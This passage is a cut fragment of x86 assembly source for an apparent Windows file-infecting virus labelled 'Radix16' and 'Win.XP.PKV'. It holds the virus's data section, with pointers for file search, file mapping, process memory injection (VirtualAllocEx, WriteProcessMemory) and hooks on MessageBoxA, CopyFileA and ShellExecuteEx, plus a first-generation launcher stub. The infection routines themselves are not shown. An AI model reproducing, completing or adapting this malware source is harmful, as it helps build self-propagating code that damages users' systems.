+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+; DATA
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/
+tmp				dd		0
+decompress_b   			db              28 dup (?)
+
+dd_apis:						; API offsetz
+reserved_by_radix16             dd              ?       ; :)
+ddFindFirstFileA                dd              ?
+ddFindNextFileA                 dd              ?
+ddFindClose                     dd              ?
+ddCreateFileA                   dd              ?
+ddCreateFileMappingA            dd              ?
+ddMapViewOfFile                 dd              ?
+ddUnmapViewOfFile               dd              ?
+ddCloseHandle                   dd              ?
+ddGetVersion			dd		?
+ddOpenProcess			dd		?
+ddVirtualAllocEx		dd		?
+ddWriteProcessMemory		dd		?
+ddReadProcessMemory		dd		?
+ddGetProcAddress		dd		?
+ddLoadLibraryA			dd		?
+ddFreeLibrary			dd		?
+ddGetCurrentDirectoryA		dd		?
+ddSetCurrentDirectoryA		dd		?
+
+; HOOK
+o_MessageBoxA			dd		?
+o_CopyFileA			dd		?
+o_ShellExecuteEx		dd		?
+
+cmp_res				dd		?
+
+kernel32                        dd              ?
+
+filetime                        struc
+        FT_dwLowDateTime        dd              ?
+        FT_dwHighDateTime       dd              ?
+filetime                        ends
+							; Find DATA
+win32_find_data                 struc
+        FileAttributes          dd              ?
+        CreationTime            filetime        ?
+        LastAccessTime          filetime        ?
+        LastWriteTime           filetime        ?
+        FileSizeHigh            dd              ?
+        FileSizeLow             dd              ?
+        Reserved0               dd              ?
+        Reserved1               dd              ?
+        FileName                dd              max_path DUP (?)
+        AlternateFileName       dd              13 DUP (?)
+                                dd              3 DUP (?)
+win32_find_data                 ends
+
+search                          win32_find_data ?
+
+dir_buf				db 256 dup (?)
+virtual_end:
+
+first_generation:					; First generation
+        	push    00000000h
+        	call    xxx_
+        	db      'Radix16',0
+xxx_:
+        	call    zzz_
+        	db      'First generation!',0
+zzz_:
+        	push    00000000h
+        	call    MessageBoxA				; create MessageBox
+
+       	 	push    0
+        	call    ExitProcess				; Exit 
+ends
+end start                                                   
+;/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/ 
+
+
+Win.XP.PKV Binary
